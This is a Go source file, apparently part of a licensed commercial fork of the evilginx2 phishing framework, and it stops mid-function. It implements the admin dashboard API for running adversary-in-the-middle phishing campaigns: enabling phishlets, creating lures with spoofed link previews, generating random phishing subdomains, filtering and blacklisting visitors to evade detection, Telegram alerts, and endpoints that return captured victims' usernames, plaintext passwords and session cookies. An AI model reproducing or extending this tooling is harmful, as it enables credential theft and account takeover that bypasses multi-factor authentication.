package core

import (
	"bytes"
	"crypto/rand"
	"crypto/subtle"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/mux"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type AdminAPI struct {
	cfg          *Config
	crt_db       *CertDb
	db           *database.Database
	p            *HttpProxy
	bl           *Blacklist
	security     *SecurityModule
	developer    bool
	server       *http.Server
	apiKey       string
	sessions     map[string]time.Time
	mu           sync.RWMutex
	loginLimiter *RateLimiter  // ✅ SECURITY FIX: Rate limiter for login attempts
	jwtValidator *JWTValidator // ✅ NEW: JWT validation for unified auth
	licenseManager *LicenseManager // ✅ NEW: License management
}

type APIResponse struct {
	Success bool        `json:"success"`
	Message string      `json:"message,omitempty"`
	Data    interface{} `json:"data,omitempty"`
}

type DashboardStats struct {
	TotalSessions     int      `json:"total_sessions"`
	CapturedTokens    int      `json:"captured_tokens"`
	ActivePhishlets   int      `json:"active_phishlets"`
	TotalPhishlets    int      `json:"total_phishlets"`
	TotalLures        int      `json:"total_lures"`
	BlacklistMode     string   `json:"blacklist_mode"`
	Domain            string   `json:"domain"`
	ExternalIP        string   `json:"external_ip"`
	RecentSessions    []SessionInfo `json:"recent_sessions"`
}

type SessionInfo struct {
	Id         int    `json:"id"`
	Phishlet   string `json:"phishlet"`
	Username   string `json:"username"`
	Password   string `json:"password"`
	HasTokens  bool   `json:"has_tokens"`
	RemoteAddr string `json:"remote_addr"`
	UserAgent  string `json:"user_agent"`
	LandingURL string `json:"landing_url"`
	CreateTime string `json:"create_time"`
	UpdateTime string `json:"update_time"`
	Tokens     interface{} `json:"tokens,omitempty"`
	Custom     map[string]string `json:"custom,omitempty"`
}

type PhishletInfo struct {
	Name       string `json:"name"`
	Status     string `json:"status"`
	Visibility string `json:"visibility"`
	Hostname   string `json:"hostname"`
	UnauthUrl  string `json:"unauth_url"`
	IsTemplate bool   `json:"is_template"`
	ParentName string `json:"parent_name"`
}

type LureInfo struct {
	Id              int    `json:"id"`
	Phishlet        string `json:"phishlet"`
	Hostname        string `json:"hostname"`
	Path            string `json:"path"`
	RedirectUrl     string `json:"redirect_url"`
	Redirector      string `json:"redirector"`
	UserAgentFilter string `json:"ua_filter"`
	Info            string `json:"info"`
	OgTitle         string `json:"og_title"`
	OgDescription   string `json:"og_desc"`
	OgImageUrl      string `json:"og_image"`
	OgUrl           string `json:"og_url"`
	PausedUntil     int64  `json:"paused_until"`
	PhishUrl        string `json:"phish_url,omitempty"`
}

type ConfigInfo struct {
	Domain       string `json:"domain"`
	ExternalIPv4 string `json:"external_ipv4"`
	BindIPv4     string `json:"bind_ipv4"`
	HttpsPort    int    `json:"https_port"`
	DnsPort      int    `json:"dns_port"`
	UnauthUrl    string `json:"unauth_url"`
	Autocert     bool   `json:"autocert"`
}

type ProxyInfo struct {
	Enabled  bool   `json:"enabled"`
	Type     string `json:"type"`
	Address  string `json:"address"`
	Port     int    `json:"port"`
	Username string `json:"username"`
	Password string `json:"password"`
}

type TelegramInfo struct {
	Enabled  bool   `json:"enabled"`
	BotToken string `json:"bot_token"`
	ChatID   string `json:"chat_id"`
}

func NewAdminAPI(cfg *Config, crt_db *CertDb, db *database.Database, p *HttpProxy, bl *Blacklist, developer bool, dataDir string, licenseManager *LicenseManager) (*AdminAPI, error) {
	api := &AdminAPI{
		cfg:            cfg,
		crt_db:         crt_db,
		db:             db,
		p:              p,
		bl:             bl,
		developer:      developer,
		sessions:       make(map[string]time.Time),
		licenseManager: licenseManager,
	}

	// Initialize security module
	securityConfigPath := filepath.Join(dataDir, "security.json")
	security, err := NewSecurityModule(cfg, securityConfigPath)
	if err != nil {
		log.Warning("admin_api: failed to initialize security module: %v", err)
	} else {
		api.security = security
	}

	// ✅ SECURITY FIX: Initialize rate limiter (5 attempts per 15 minutes)
	api.loginLimiter = NewRateLimiter(5, 15*time.Minute)

	// ✅ NEW: Initialize JWT validator if license manager available
	if licenseManager != nil {
		api.jwtValidator = NewJWTValidator(licenseManager.ManagementPlatformURL)
		log.Info("Unified authentication enabled - users can login with Management Platform credentials")
	}

	// Generate or load API key (legacy/fallback)
	api.apiKey = api.generateAPIKey()
	
	// ✅ SECURITY FIX: Start session cleanup goroutine
	go api.cleanupExpiredSessions()

	return api, nil
}

func (api *AdminAPI) generateAPIKey() string {
	// First, check if an API key already exists (set by Management Platform during deployment)
	keyFile := filepath.Join(filepath.Dir(os.Args[0]), "api_key.txt")
	
	if existingKey, err := os.ReadFile(keyFile); err == nil {
		key := strings.TrimSpace(string(existingKey))
		if len(key) >= 32 {
			log.Info("using pre-configured API key from Management Platform")
			return key
		}
	}
	
	// No existing key found, generate a new one
	b := make([]byte, 32)
	rand.Read(b)
	key := hex.EncodeToString(b)
	// Save API key to file for easy access
	os.WriteFile(keyFile, []byte(key), 0600)
	log.Info("generated new API key")
	return key
}

// ✅ SECURITY FIX: Cleanup expired sessions periodically
func (api *AdminAPI) cleanupExpiredSessions() {
	ticker := time.NewTicker(1 * time.Hour)
	defer ticker.Stop()
	
	for range ticker.C {
		api.mu.Lock()
		now := time.Now()
		cleaned := 0
		for sessionID, expiry := range api.sessions {
			if now.After(expiry) {
				delete(api.sessions, sessionID)
				cleaned++
			}
		}
		if cleaned > 0 {
			log.Info("cleaned up %d expired sessions", cleaned)
		}
		api.mu.Unlock()
	}
}

func (api *AdminAPI) Start(bindAddr string, port int) error {
	r := mux.NewRouter()

	// Serve static files for the dashboard
	staticDir := filepath.Join(filepath.Dir(os.Args[0]), "admin")
	if _, err := os.Stat(staticDir); os.IsNotExist(err) {
		// Try current directory
		staticDir = "./admin"
	}

	// API routes
	apiRouter := r.PathPrefix("/api").Subrouter()
	apiRouter.Use(api.authMiddleware)

	// Dashboard stats
	apiRouter.HandleFunc("/stats", api.handleStats).Methods("GET")

	// Config endpoints
	apiRouter.HandleFunc("/config", api.handleGetConfig).Methods("GET")
	apiRouter.HandleFunc("/config", api.handleSetConfig).Methods("POST")

	// Phishlets endpoints
	apiRouter.HandleFunc("/phishlets", api.handleListPhishlets).Methods("GET")
	apiRouter.HandleFunc("/phishlets/{name}", api.handleGetPhishlet).Methods("GET")
	apiRouter.HandleFunc("/phishlets/{name}/enable", api.handleEnablePhishlet).Methods("POST")
	apiRouter.HandleFunc("/phishlets/{name}/disable", api.handleDisablePhishlet).Methods("POST")
	apiRouter.HandleFunc("/phishlets/{name}/hide", api.handleHidePhishlet).Methods("POST")
	apiRouter.HandleFunc("/phishlets/{name}/unhide", api.handleUnhidePhishlet).Methods("POST")
	apiRouter.HandleFunc("/phishlets/{name}/hostname", api.handleSetPhishletHostname).Methods("POST")
	apiRouter.HandleFunc("/phishlets/{name}/hostname/generate", api.handleGeneratePhishletHostname).Methods("POST")
	apiRouter.HandleFunc("/phishlets/{name}/hosts", api.handleGetPhishletHosts).Methods("GET")
	apiRouter.HandleFunc("/phishlets/hostnames/generate-all", api.handleGenerateAllHostnames).Methods("POST")

	// Sessions endpoints
	apiRouter.HandleFunc("/sessions", api.handleListSessions).Methods("GET")
	apiRouter.HandleFunc("/sessions/{id}", api.handleGetSession).Methods("GET")
	apiRouter.HandleFunc("/sessions/{id}", api.handleDeleteSession).Methods("DELETE")
	apiRouter.HandleFunc("/sessions", api.handleDeleteAllSessions).Methods("DELETE")

	// Lures endpoints
	apiRouter.HandleFunc("/lures", api.handleListLures).Methods("GET")
	apiRouter.HandleFunc("/lures", api.handleCreateLure).Methods("POST")
	apiRouter.HandleFunc("/lures/{id}", api.handleGetLure).Methods("GET")
	apiRouter.HandleFunc("/lures/{id}", api.handleEditLure).Methods("PUT")
	apiRouter.HandleFunc("/lures/{id}", api.handleDeleteLure).Methods("DELETE")
	apiRouter.HandleFunc("/lures/{id}/url", api.handleGetLureUrl).Methods("GET")
	apiRouter.HandleFunc("/lures/{id}/pause", api.handlePauseLure).Methods("POST")
	apiRouter.HandleFunc("/lures/{id}/unpause", api.handleUnpauseLure).Methods("POST")

	// Blacklist endpoints
	apiRouter.HandleFunc("/blacklist", api.handleGetBlacklist).Methods("GET")
	apiRouter.HandleFunc("/blacklist", api.handleSetBlacklist).Methods("POST")

	// Proxy endpoints
	apiRouter.HandleFunc("/proxy", api.handleGetProxy).Methods("GET")
	apiRouter.HandleFunc("/proxy", api.handleSetProxy).Methods("POST")

	// Telegram endpoints
	apiRouter.HandleFunc("/telegram", api.handleGetTelegram).Methods("GET")
	apiRouter.HandleFunc("/telegram", api.handleSetTelegram).Methods("POST")
	apiRouter.HandleFunc("/telegram/test", api.handleTestTelegram).Methods("POST")

	// Redirectors endpoint
	apiRouter.HandleFunc("/redirectors", api.handleListRedirectors).Methods("GET")

	// Security endpoints
	apiRouter.HandleFunc("/security", api.handleGetSecurity).Methods("GET")
	apiRouter.HandleFunc("/security", api.handleSetSecurity).Methods("POST")
	apiRouter.HandleFunc("/security/blocked-ranges", api.handleGetBlockedRanges).Methods("GET")
	apiRouter.HandleFunc("/security/blocked-ranges", api.handleAddBlockedRange).Methods("POST")
	apiRouter.HandleFunc("/security/blocked-ranges", api.handleRemoveBlockedRange).Methods("DELETE")
	apiRouter.HandleFunc("/security/whitelisted-ips", api.handleGetWhitelistedIPs).Methods("GET")
	apiRouter.HandleFunc("/security/whitelisted-ips", api.handleAddWhitelistedIP).Methods("POST")
	apiRouter.HandleFunc("/security/whitelisted-ips", api.handleRemoveWhitelistedIP).Methods("DELETE")
	apiRouter.HandleFunc("/security/test-ip", api.handleTestIP).Methods("POST")

	// Auth endpoints (no middleware)
	r.HandleFunc("/api/login", api.handleLogin).Methods("POST")
	r.HandleFunc("/api/logout", api.handleLogout).Methods("POST")
	r.HandleFunc("/api/check-auth", api.handleCheckAuth).Methods("GET")

	// Serve static files
	r.PathPrefix("/").Handler(http.StripPrefix("/", http.FileServer(http.Dir(staticDir))))

	addr := fmt.Sprintf("%s:%d", bindAddr, port)
	api.server = &http.Server{
		Addr:         addr,
		Handler:      r,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
	}

	log.Info("admin dashboard available at: http://%s", addr)
	// ✅ SECURITY FIX: Only log first 8 characters of API key
	log.Info("admin API key: %s... (saved to api_key.txt)", api.apiKey[:8])

	go func() {
		if err := api.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Error("admin API server error: %v", err)
		}
	}()

	return nil
}

func (api *AdminAPI) authMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")

		// ✅ NEW: Check JWT token from Management Platform (Priority 1)
		authHeader := r.Header.Get("Authorization")
		if authHeader != "" && api.jwtValidator != nil {
			// Extract Bearer token
			token := authHeader
			if len(authHeader) > 7 && authHeader[:7] == "Bearer " {
				token = authHeader[7:]
			}

			validation, err := api.jwtValidator.ValidateToken(token)
			if err == nil {
				// Check if user owns this instance OR is admin
				if api.licenseManager != nil {
					instanceUserID := api.licenseManager.GetUserID()
					if validation.UserID == instanceUserID || validation.IsAdmin {
						// Store user info in request context (optional, for logging)
						r.Header.Set("X-User-ID", validation.UserID)
						r.Header.Set("X-User-Email", validation.Email)
						next.ServeHTTP(w, r)
						return
					} else {
						log.Warning("JWT valid but user %s does not own this instance (owner: %s)", validation.Email, instanceUserID)
						api.jsonResponse(w, http.StatusForbidden, APIResponse{Success: false, Message: "You do not have access to this instance"})
						return
					}
				} else {
					// No license manager, allow any valid JWT
					next.ServeHTTP(w, r)
					return
				}
			}
			// JWT validation failed, continue to other methods
		}

		// Check API key in header (Legacy/Fallback)
		apiKey := r.Header.Get("X-API-Key")
		if apiKey != "" && subtle.ConstantTimeCompare([]byte(apiKey), []byte(api.apiKey)) == 1 {
			next.ServeHTTP(w, r)
			return
		}

		// Check session cookie (Legacy/Fallback)
		cookie, err := r.Cookie("admin_session")
		if err == nil {
			api.mu.RLock()
			expiry, exists := api.sessions[cookie.Value]
			api.mu.RUnlock()
			if exists && time.Now().Before(expiry) {
				next.ServeHTTP(w, r)
				return
			}
		}

		api.jsonResponse(w, http.StatusUnauthorized, APIResponse{Success: false, Message: "Unauthorized"})
	})
}

func (api *AdminAPI) jsonResponse(w http.ResponseWriter, status int, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(data)
}

func (api *AdminAPI) handleLogin(w http.ResponseWriter, r *http.Request) {
	// ✅ SECURITY FIX: Rate limiting
	clientIP := getClientIP(r)
	if !api.loginLimiter.Allow(clientIP) {
		api.jsonResponse(w, http.StatusTooManyRequests, APIResponse{
			Success: false, 
			Message: "Too many login attempts. Please try again in 15 minutes.",
		})
		log.Warning("rate limit exceeded for IP: %s", clientIP)
		return
	}

	var req struct {
		APIKey   string `json:"api_key"`
		Email    string `json:"email"`
		Password string `json:"password"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid request"})
		return
	}

	authenticated := false
	var userEmail string
	var userRole string

	// Method 1: Email/Password authentication via Management Platform
	if req.Email != "" && req.Password != "" && api.licenseManager != nil {
		// Call Management Platform to authenticate
		authResult := api.authenticateWithManagementPlatform(req.Email, req.Password)
		if authResult.Success {
			authenticated = true
			userEmail = req.Email
			userRole = authResult.Role
			log.Info("user '%s' authenticated via Management Platform", userEmail)
		}
	}

	// Method 2: Legacy API key authentication (fallback)
	if !authenticated && req.APIKey != "" {
		if subtle.ConstantTimeCompare([]byte(req.APIKey), []byte(api.apiKey)) == 1 {
			authenticated = true
			userEmail = "admin"
			userRole = "admin"
			log.Info("admin authenticated via API key")
		}
	}

	if !authenticated {
		api.jsonResponse(w, http.StatusUnauthorized, APIResponse{Success: false, Message: "Invalid credentials"})
		return
	}

	// Create session with user info
	sessionBytes := make([]byte, 32)
	rand.Read(sessionBytes)
	sessionID := base64.URLEncoding.EncodeToString(sessionBytes)

	api.mu.Lock()
	api.sessions[sessionID] = time.Now().Add(24 * time.Hour)
	api.mu.Unlock()

	// ✅ SECURITY FIX: Add Secure and SameSite flags
	http.SetCookie(w, &http.Cookie{
		Name:     "admin_session",
		Value:    sessionID,
		Path:     "/",
		HttpOnly: true,
		Secure:   false,                   // Allow HTTP for dev (set true in production)
		SameSite: http.SameSiteLaxMode,    // Allow cross-site for dashboard access
		MaxAge:   86400,
	})

	api.jsonResponse(w, http.StatusOK, APIResponse{
		Success: true, 
		Message: "Login successful",
		Data: map[string]interface{}{
			"email": userEmail,
			"role":  userRole,
		},
	})
}

// authenticateWithManagementPlatform validates credentials against the Management Platform
func (api *AdminAPI) authenticateWithManagementPlatform(email, password string) struct {
	Success bool
	Role    string
	Token   string
} {
	result := struct {
		Success bool
		Role    string
		Token   string
	}{Success: false}

	if api.licenseManager == nil || api.licenseManager.ManagementPlatformURL == "" {
		return result
	}

	// Call Management Platform login endpoint
	loginData := map[string]string{
		"email":    email,
		"password": password,
	}
	jsonData, _ := json.Marshal(loginData)

	url := api.licenseManager.ManagementPlatformURL + "/api/auth/login"
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	if err != nil {
		log.Error("failed to create auth request: %v", err)
		return result
	}
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		log.Error("failed to authenticate with Management Platform: %v", err)
		return result
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return result
	}

	var authResponse struct {
		Token string `json:"token"`
		User  struct {
			Email string `json:"email"`
			Role  string `json:"role"`
		} `json:"user"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&authResponse); err != nil {
		log.Error("failed to decode auth response: %v", err)
		return result
	}

	result.Success = true
	result.Token = authResponse.Token
	result.Role = authResponse.User.Role
	return result
}

func (api *AdminAPI) handleLogout(w http.ResponseWriter, r *http.Request) {
	cookie, err := r.Cookie("admin_session")
	if err == nil {
		api.mu.Lock()
		delete(api.sessions, cookie.Value)
		api.mu.Unlock()
	}

	http.SetCookie(w, &http.Cookie{
		Name:   "admin_session",
		Value:  "",
		Path:   "/",
		MaxAge: -1,
	})

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Message: "Logged out"})
}

func (api *AdminAPI) handleCheckAuth(w http.ResponseWriter, r *http.Request) {
	cookie, err := r.Cookie("admin_session")
	if err != nil {
		api.jsonResponse(w, http.StatusOK, APIResponse{Success: false})
		return
	}

	api.mu.RLock()
	expiry, exists := api.sessions[cookie.Value]
	api.mu.RUnlock()

	if exists && time.Now().Before(expiry) {
		api.jsonResponse(w, http.StatusOK, APIResponse{Success: true})
		return
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: false})
}

func (api *AdminAPI) handleStats(w http.ResponseWriter, r *http.Request) {
	sessions, err := api.db.ListSessions()
	if err != nil {
		sessions = []*database.Session{}
	}

	capturedTokens := 0
	recentSessions := []SessionInfo{}
	for _, s := range sessions {
		if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
			capturedTokens++
		}
	}

	// Get last 5 sessions
	count := 5
	if len(sessions) < count {
		count = len(sessions)
	}
	for i := len(sessions) - 1; i >= len(sessions)-count && i >= 0; i-- {
		s := sessions[i]
		recentSessions = append(recentSessions, SessionInfo{
			Id:         s.Id,
			Phishlet:   s.Phishlet,
			Username:   s.Username,
			Password:   s.Password,
			HasTokens:  len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0,
			RemoteAddr: s.RemoteAddr,
			CreateTime: time.Unix(s.CreateTime, 0).Format("2006-01-02 15:04:05"),
		})
	}

	activePhishlets := 0
	totalPhishlets := 0
	for name := range api.cfg.phishlets {
		totalPhishlets++
		if api.cfg.IsSiteEnabled(name) {
			activePhishlets++
		}
	}

	stats := DashboardStats{
		TotalSessions:   len(sessions),
		CapturedTokens:  capturedTokens,
		ActivePhishlets: activePhishlets,
		TotalPhishlets:  totalPhishlets,
		TotalLures:      len(api.cfg.lures),
		BlacklistMode:   api.cfg.GetBlacklistMode(),
		Domain:          api.cfg.GetBaseDomain(),
		ExternalIP:      api.cfg.GetServerExternalIP(),
		RecentSessions:  recentSessions,
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Data: stats})
}

func (api *AdminAPI) handleGetConfig(w http.ResponseWriter, r *http.Request) {
	config := ConfigInfo{
		Domain:       api.cfg.GetBaseDomain(),
		ExternalIPv4: api.cfg.GetServerExternalIP(),
		BindIPv4:     api.cfg.GetServerBindIP(),
		HttpsPort:    api.cfg.GetHttpsPort(),
		DnsPort:      api.cfg.GetDnsPort(),
		UnauthUrl:    api.cfg.general.UnauthUrl,
		Autocert:     api.cfg.IsAutocertEnabled(),
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Data: config})
}

func (api *AdminAPI) handleSetConfig(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Field string `json:"field"`
		Value string `json:"value"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid request"})
		return
	}

	switch req.Field {
	case "domain":
		api.cfg.SetBaseDomain(req.Value)
		api.cfg.ResetAllSites()
	case "external_ipv4":
		api.cfg.SetServerExternalIP(req.Value)
	case "bind_ipv4":
		api.cfg.SetServerBindIP(req.Value)
	case "unauth_url":
		if req.Value != "" {
			if _, err := url.ParseRequestURI(req.Value); err != nil {
				api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid URL"})
				return
			}
		}
		api.cfg.SetUnauthUrl(req.Value)
	case "autocert":
		api.cfg.EnableAutocert(req.Value == "true" || req.Value == "on")
	default:
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Unknown field"})
		return
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Message: "Configuration updated"})
}

func (api *AdminAPI) handleListPhishlets(w http.ResponseWriter, r *http.Request) {
	var phishlets []PhishletInfo

	for name, pl := range api.cfg.phishlets {
		status := "disabled"
		if pl.isTemplate {
			status = "template"
		} else if api.cfg.IsSiteEnabled(name) {
			status = "enabled"
		}

		visibility := "visible"
		if api.cfg.IsSiteHidden(name) {
			visibility = "hidden"
		}

		hostname, _ := api.cfg.GetSiteDomain(name)
		unauthUrl, _ := api.cfg.GetSiteUnauthUrl(name)

		phishlets = append(phishlets, PhishletInfo{
			Name:       name,
			Status:     status,
			Visibility: visibility,
			Hostname:   hostname,
			UnauthUrl:  unauthUrl,
			IsTemplate: pl.isTemplate,
			ParentName: pl.ParentName,
		})
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Data: phishlets})
}

func (api *AdminAPI) handleGetPhishlet(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]

	pl, err := api.cfg.GetPhishlet(name)
	if err != nil {
		api.jsonResponse(w, http.StatusNotFound, APIResponse{Success: false, Message: "Phishlet not found"})
		return
	}

	status := "disabled"
	if pl.isTemplate {
		status = "template"
	} else if api.cfg.IsSiteEnabled(name) {
		status = "enabled"
	}

	visibility := "visible"
	if api.cfg.IsSiteHidden(name) {
		visibility = "hidden"
	}

	hostname, _ := api.cfg.GetSiteDomain(name)
	unauthUrl, _ := api.cfg.GetSiteUnauthUrl(name)

	info := PhishletInfo{
		Name:       name,
		Status:     status,
		Visibility: visibility,
		Hostname:   hostname,
		UnauthUrl:  unauthUrl,
		IsTemplate: pl.isTemplate,
		ParentName: pl.ParentName,
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Data: info})
}

func (api *AdminAPI) handleEnablePhishlet(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]

	err := api.cfg.SetSiteEnabled(name)
	if err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: err.Error()})
		return
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Message: "Phishlet enabled"})
}

func (api *AdminAPI) handleDisablePhishlet(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]

	err := api.cfg.SetSiteDisabled(name)
	if err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: err.Error()})
		return
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Message: "Phishlet disabled"})
}

func (api *AdminAPI) handleHidePhishlet(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]

	err := api.cfg.SetSiteHidden(name, true)
	if err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: err.Error()})
		return
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Message: "Phishlet hidden"})
}

func (api *AdminAPI) handleUnhidePhishlet(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]

	err := api.cfg.SetSiteHidden(name, false)
	if err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: err.Error()})
		return
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Message: "Phishlet visible"})
}

func (api *AdminAPI) handleSetPhishletHostname(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]

	var req struct {
		Hostname string `json:"hostname"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid request"})
		return
	}

	if !api.cfg.SetSiteHostname(name, req.Hostname) {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Failed to set hostname"})
		return
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Message: "Hostname updated"})
}

func (api *AdminAPI) handleGeneratePhishletHostname(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]

	// Check if base domain is configured
	baseDomain := api.cfg.GetBaseDomain()
	if baseDomain == "" {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Base domain not configured. Set domain in General Settings first."})
		return
	}

	// Check if phishlet exists and is not a template
	pl, err := api.cfg.GetPhishlet(name)
	if err != nil {
		api.jsonResponse(w, http.StatusNotFound, APIResponse{Success: false, Message: "Phishlet not found: " + name})
		return
	}
	if pl.isTemplate {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Cannot set hostname on template phishlet"})
		return
	}

	// Generate random subdomain (8 characters)
	randBytes := make([]byte, 4)
	rand.Read(randBytes)
	randomSubdomain := hex.EncodeToString(randBytes)
	
	// Create full hostname with random subdomain
	hostname := randomSubdomain + "." + baseDomain

	// Set the hostname
	if !api.cfg.SetSiteHostname(name, hostname) {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Failed to set hostname. Make sure domain '" + baseDomain + "' is configured correctly."})
		return
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{
		Success: true, 
		Message: "Hostname generated",
		Data: map[string]string{"hostname": hostname},
	})
}

// handleGenerateAllHostnames generates random hostnames for all non-template phishlets
func (api *AdminAPI) handleGenerateAllHostnames(w http.ResponseWriter, r *http.Request) {
	// Check if base domain is configured
	baseDomain := api.cfg.GetBaseDomain()
	if baseDomain == "" {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Base domain not configured"})
		return
	}

	// Get all phishlets
	phishlets := api.cfg.GetPhishletsList()
	generated := 0
	failed := 0
	results := make(map[string]string)

	for _, name := range phishlets {
		pl, err := api.cfg.GetPhishlet(name)
		if err != nil {
			continue
		}

		// Skip templates
		if pl.isTemplate {
			continue
		}

		// Generate random subdomain
		randBytes := make([]byte, 4)
		rand.Read(randBytes)
		randomSubdomain := hex.EncodeToString(randBytes)
		hostname := randomSubdomain + "." + baseDomain

		// Set the hostname
		if api.cfg.SetSiteHostname(name, hostname) {
			generated++
			results[name] = hostname
		} else {
			failed++
		}
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{
		Success: true,
		Message: fmt.Sprintf("Generated %d hostnames (%d failed)", generated, failed),
		Data:    results,
	})
}

func (api *AdminAPI) handleGetPhishletHosts(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	name := vars["name"]

	pl, err := api.cfg.GetPhishlet(name)
	if err != nil {
		api.jsonResponse(w, http.StatusNotFound, APIResponse{Success: false, Message: "Phishlet not found"})
		return
	}

	hosts := pl.GetPhishHosts(false)
	var entries []string
	for _, h := range hosts {
		entries = append(entries, api.cfg.GetServerExternalIP()+" "+h)
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Data: entries})
}

func (api *AdminAPI) handleListSessions(w http.ResponseWriter, r *http.Request) {
	sessions, err := api.db.ListSessions()
	if err != nil {
		api.jsonResponse(w, http.StatusInternalServerError, APIResponse{Success: false, Message: "Failed to list sessions"})
		return
	}

	var sessionList []SessionInfo
	for _, s := range sessions {
		sessionList = append(sessionList, SessionInfo{
			Id:         s.Id,
			Phishlet:   s.Phishlet,
			Username:   s.Username,
			Password:   s.Password,
			HasTokens:  len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0,
			RemoteAddr: s.RemoteAddr,
			UserAgent:  s.UserAgent,
			LandingURL: s.LandingURL,
			CreateTime: time.Unix(s.CreateTime, 0).Format("2006-01-02 15:04:05"),
			UpdateTime: time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04:05"),
		})
	}

	api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Data: sessionList})
}

func (api *AdminAPI) handleGetSession(w http.ResponseWriter, r *http.Request) {
	vars := mux.Vars(r)
	id, err := strconv.Atoi(vars["id"])
	if err != nil {
		api.jsonResponse(w, http.StatusBadRequest, APIResponse{Success: false, Message: "Invalid session ID"})
		return
	}

	sessions, err := api.db.ListSessions()
	if err != nil {
		api.jsonResponse(w, http.StatusInternalServerError, APIResponse{Success: false, Message: "Failed to get sessions"})
		return
	}

	for _, s := range sessions {
		if s.Id == id {
			info := SessionInfo{
				Id:         s.Id,
				Phishlet:   s.Phishlet,
				Username:   s.Username,
				Password:   s.Password,
				HasTokens:  len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0,
				RemoteAddr: s.RemoteAddr,
				UserAgent:  s.UserAgent,
				LandingURL: s.LandingURL,
				CreateTime: time.Unix(s.CreateTime, 0).Format("2006-01-02 15:04:05"),
				UpdateTime: time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04:05"),
				Custom:     s.Custom,
			}

			// Add tokens
			if len(s.CookieTokens) > 0 {
				info.Tokens = api.cookieTokensToJSON(s.CookieTokens)
			}

			api.jsonResponse(w, http.StatusOK, APIResponse{Success: true, Data: info})
			return
		}
	}

	api.jsonResponse(w, http.StatusNotFound, APIResponse{Success: false, Message: "Session not found"})
}

func (api *AdminAPI) cookieTokensToJSON(tokens map[string]map[string]*database.CookieToken) interface{} {
	type Cookie struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		ExpiresHuman   string `json:"expiresHuman,omitempty"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly"`
		HostOnly       bool   `json:"hostOnly"`
		Secure         bool   `json:"secure"`
		Session        bool   `json:"session"`
		SameSite       string `json:"sameSite,omitempty"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
